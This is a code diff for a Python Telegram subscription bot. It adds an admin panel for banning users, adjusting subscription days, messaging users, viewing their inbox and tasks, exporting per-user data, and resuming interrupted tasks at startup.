+                                        esc((m.get("text") or "")[:110]))
+                            for m in msgs)) if msgs else ""))
+
+
+def admin_user_kb(uid) -> InlineKeyboardMarkup:
+    rec = _u_rec(uid)
+    banned = bool(rec.get("banned"))
+    rows = [
+        [InlineKeyboardButton(("✅ UNBAN" if banned else "🚫 BAN"), callback_data="a:u:%s:%s"
+                              % (uid, "unban" if banned else "ban"))],
+        [InlineKeyboardButton("➕ 7 DIN", callback_data="a:u:%s:plus:7" % uid),
+         InlineKeyboardButton("➕ 30 DIN", callback_data="a:u:%s:plus:30" % uid)],
+        [InlineKeyboardButton("➖ 7 DIN", callback_data="a:u:%s:minus:7" % uid),
+         InlineKeyboardButton("➖ 30 DIN", callback_data="a:u:%s:minus:30" % uid)],
+        [InlineKeyboardButton("✉️ SEND MESSAGE", callback_data="a:u:%s:msg" % uid),
+         InlineKeyboardButton("📨 INBOX", callback_data="a:u:%s:inbox" % uid)],
+        [InlineKeyboardButton("📦 ALL DATA", callback_data="a:u:%s:data" % uid),
+         InlineKeyboardButton("📋 TASKS", callback_data="a:u:%s:tasks" % uid)],
+        [InlineKeyboardButton("🧅 PROXY OFF", callback_data="a:u:%s:proxyoff" % uid)],
+        [InlineKeyboardButton("⬅️ USERS", callback_data="a:users")],
+    ]
+    return RK(rows)
+
+
+def admin_users_list() -> tuple:
+    lst = sorted(USERS.items(), key=lambda z: z[1].get("last") or "", reverse=True)[:18]
+    body = "\n".join("• <code>%s</code> %s %s" % (
+        u, esc((r.get("name") or "?")[:20]),
+        "🚫" if r.get("banned") else
+        ("✅" if (r.get("expires") or "") > datetime.now().isoformat() else "⚪"))
+        for u, r in lst) or "—"
+    rows, row = [], []
+    for u, r in lst:
+        row.append(InlineKeyboardButton("%s %s" % ("🚫" if r.get("banned") else "·",
+                                                  (r.get("name") or u)[:12]),
+                                        callback_data="a:u:%s" % u))
+        if len(row) == 2:
+            rows.append(row)
+            row = []
+    if row:
+        rows.append(row)
+    rows.append([InlineKeyboardButton("⬇️ CSV EXPORT", callback_data="a:userscsv")])
+    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="a:home")])
+    return body, RK(rows)
+
+
+def admin_user_data(uid) -> dict:
+    rec = dict(_u_rec(uid))
+    return {"user": rec, "tasks": tasks_of(uid), "inbox": inbox_get(uid, 40),
+            "keys": {k: v for k, v in KEYS.items() if str(v.get("used_by")) == str(uid)},
+            "exported": datetime.now().isoformat(timespec="seconds")}
+
+
+async def admin_user_action(update, context, rest: str):
+    """a:u:<uid>[:action[:arg]]"""
+    q = update.callback_query
+    parts = rest.split(":")
+    tuid = parts[0] if parts else ""
+    act = parts[1] if len(parts) > 1 else ""
+    arg = parts[2] if len(parts) > 2 else ""
+
+    async def ed(txt=None, kb=None):
+        try:
+            await q.edit_message_text(txt or admin_user_card(tuid),
+                                      parse_mode=ParseMode.HTML,
+                                      reply_markup=kb or admin_user_kb(tuid))
+        except Exception:
+            pass
+
+    if not tuid:
+        return
+    rec = USERS.get(str(tuid))
+    if rec is None:
+        try:
+            await q.answer("User not found", show_alert=True)
+        except Exception:
+            pass
+        return
+    if act == "ban":
+        rec["banned"] = True
+        rec["banned_ts"] = datetime.now().isoformat(timespec="seconds")
+        jsave("users", USERS)
+        try:
+            await q.answer("🚫 Banned")
+        except Exception:
+            pass
+        return await ed()
+    if act == "unban":
+        rec.pop("banned", None)
+        rec.pop("banned_ts", None)
+        jsave("users", USERS)
+        try:
+            await q.answer("✅ Unbanned")
+        except Exception:
+            pass
+        return await ed()
+    if act in ("plus", "minus"):
+        try:
+            days = int(arg or 0)
+        except Exception:
+            days = 0
+        if days:
+            base = datetime.now()
+            try:
+                cur = datetime.fromisoformat(rec.get("expires") or "")
+                if cur > base:
+                    base = cur
+            except Exception:
+                pass
+            new = base + timedelta(days=days if act == "plus" else -days)
+            if new < datetime.now() and act == "minus":
+                new = datetime.now()
+            rec["expires"] = new.isoformat(timespec="seconds")
+            rec.pop("banned", None)
+            jsave("users", USERS)
+            try:
+                done_txt = "✅ +%d days" % days if act == "plus" else "➖ -%d days" % days
+                await q.answer(done_txt)
+            except Exception:
+                pass
+            try:
+                if BOT_REF.get("app") and act == "plus":
+                    await BOT_REF["app"].bot.send_message(
+                        chat_id=int(tuid),
+                        text="🎉 <b>Subscription active</b>\n\nAapka access <b>%s</b> tak hai.\n"
+                             "Koi problem ho to ☎️ SUPPORT se message karo."
+                             % new.strftime("%d %b %Y %H:%M"),
+                        parse_mode=ParseMode.HTML)
+            except Exception:
+                pass
+        return await ed()
+    if act == "msg":
+        await_set(context, "admin_msg")
+        context.user_data["await_admin"] = True
+        context.user_data["admin_msg_to"] = str(tuid)
+        return await ed(
+            (H("SEND MESSAGE", "to %s" % esc((rec.get("name") or tuid)[:24])) + "\n\n"
+             + P("Jo message bhejna hai likho — seedha is user ko jayega.") + "\n\n"
+             + KV("User", "<code>%s</code>" % esc(str(tuid)), "👤")),
+            kb_back("a:u:%s" % tuid))
+    if act == "inbox":
+        msgs = inbox_get(tuid, 20)
+        lines = ["%s <i>%s</i>\n%s" % ("🙋" if m.get("who") == "user" else "👑",
+                                       esc((m.get("ts") or "")[5:16]),
+                                       esc((m.get("text") or "")[:350])) for m in msgs]
+        return await ed((H("INBOX", "%d messages" % len(msgs)) + "\n\n"
+                         + ("\n\n".join(lines) if lines else P("Koi message nahi."))),
+                        kb_back("a:u:%s" % tuid))
+    if act == "tasks":
+        tks = sorted(tasks_of(tuid), key=lambda t: t.get("created") or "", reverse=True)[:10]
+        lines = ["%s <b>%s</b> · <i>%s</i> · %s/%s" % (
+            TASK_STATUS_ICON.get(t.get("status"), "•"),
+            esc(t.get("title") or t.get("kind") or "task"),
+            esc(t.get("status") or ""), fmt(t.get("total", 0) - t.get("left", 0)),
+            fmt(t.get("total", 0))) for t in tks]
+        return await ed((H("USER TASKS", str(tuid)) + "\n\n"
+                         + ("\n".join(lines) if lines else P("Koi task nahi."))),
+                        kb_back("a:u:%s" % tuid))
+    if act == "proxyoff":
+        cfg = rec.get("proxy") or {}
+        cfg["on"] = 0
+        rec["proxy"] = cfg
+        jsave("users", USERS)
+        try:
+            await q.answer("🧅 User proxy OFF")
+        except Exception:
+            pass
+        return await ed()
+    if act == "data":
+        data = admin_user_data(tuid)
+        path = dump_json(data, "user_%s" % tuid)
+        try:
+            await q.answer("📦 data file")
+        except Exception:
+            pass
+        await send_file(update, path, "📦 user %s — full data" % tuid)
+        return await ed((H("USER DATA", str(tuid)) + "\n\n"
+                         + KV("Tasks", "<code>%s</code>" % len(data["tasks"]), "🗂") + "\n"
+                         + KV("Messages", "<code>%s</code>" % len(data["inbox"]), "📨") + "\n"
+                         + KV("Keys", "<code>%s</code>" % len(data["keys"]), "🔑") + "\n\n"
+                         + P("Poora JSON file ke roop me bhej diya.")),
+                        kb_back("a:u:%s" % tuid))
+    return await ed()
+
+
+async def input_admin_msg(update, context, text: str):
+    """Admin → user direct message."""
+    target = str(context.user_data.pop("admin_msg_to", "") or "")
+    context.user_data.pop("await_admin", None)
+    text = str(text or "").strip()[:3000]
+    if not target or not text:
+        await reply_msg(update).reply_text("❌ Kuch gadbad — dobara USERS se try karo.",
+                                           reply_markup=kb_back("a:users"))
+        return
+    okk = False
+    app = BOT_REF.get("app")
+    if app:
+        try:
+            await app.bot.send_message(chat_id=int(target), text="👑 <b>Owner</b>\n\n" + esc(text),
+                                       parse_mode=ParseMode.HTML)
+            okk = True
+        except Exception as exc:
+            logger.warning("admin dm fail: %s", exc)
+    inbox_add(target, "admin", text)
+    await reply_msg(update).reply_text(
+        ("✅ <b>Message bhej diya</b>\n<code>%s</code>" % esc(target)) if okk else
+        ("⚠️ <b>Deliver nahi hua</b> (user ne bot block kiya hoga)\n<code>%s</code>"
+         % esc(target)), parse_mode=ParseMode.HTML,
+        reply_markup=kb_back("a:u:%s" % target))
+
+
+AWAIT_HANDLERS["support_msg"] = lambda *a, **k: input_support(*a, **k)
+AWAIT_HANDLERS["myproxy"] = lambda *a, **k: input_myproxy(*a, **k)
+AWAIT_HANDLERS["admin_msg"] = lambda *a, **k: input_admin_msg(*a, **k)
+
+
 TOOL_HANDLERS = {
     "dork": tool_dork,
     "kw": tool_kw,
@@ -13123,6 +14560,12 @@ TOOL_HANDLERS = {
     "qa": tool_qa,
     "rand": tool_rand,
     "dump": tool_dump,
+    "tasks": cb_tasks,
+    "expand": tool_expand,
+    "support": tool_support,
+    "support_write": cb_support_write,
+    "support_hist": cb_support_hist,
+    "myproxy": tool_myproxy,
 }
 
 
@@ -13368,15 +14811,12 @@ async def admin_callback(update, context, action: str):
         return await ed(admin_dash(), kb_admin())
 
     if action == "users":
-        rows = [[InlineKeyboardButton("⬇️ CSV EXPORT", callback_data="a:userscsv")]]
-        rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="a:home")])
-        lst = sorted(USERS.items(), key=lambda z: z[1].get("last") or "", reverse=True)[:20]
-        body = "\n".join("• <code>%s</code> %s %s" % (
-            u, esc((r.get("name") or "?")[:18]),
-            "🚫" if r.get("banned") else ("✅" if (r.get("expires") or "") > datetime.now().isoformat() else "⚪"))
-            for u, r in lst) or "—"
-        return await ed(H("ADMIN — USERS", "%d total" % len(USERS)) + "\n\n" + body,
-                       RK(rows))
+        body, kb = admin_users_list()
+        return await ed(H("ADMIN — USERS", "%d total — tap to manage" % len(USERS))
+                        + "\n\n" + body, kb)
+
+    if action.startswith("u:"):
+        return await admin_user_action(update, context, action[2:])
 
     if action == "userscsv":
         path = dump_json(USERS, "users")
@@ -13939,6 +15379,14 @@ async def _post_init(app) -> None:
         logger.info("✅ Bot commands set (/redeem included)")
     except Exception as exc:
         logger.warning("set_my_commands skip: %s", exc)
+    #  v2.21.0: adhoore tasks khud resume (bot band hone ke baad bhi)
+    try:
+        BOT_REF["app"] = app
+        tasks_load()
+        tasks_cleanup(3)
+        asyncio.create_task(tasks_resume_all(8.0))
+    except Exception as exc:
+        logger.warning("tasks resume skip: %s", exc)
 
 
 def build_app() -> Application:
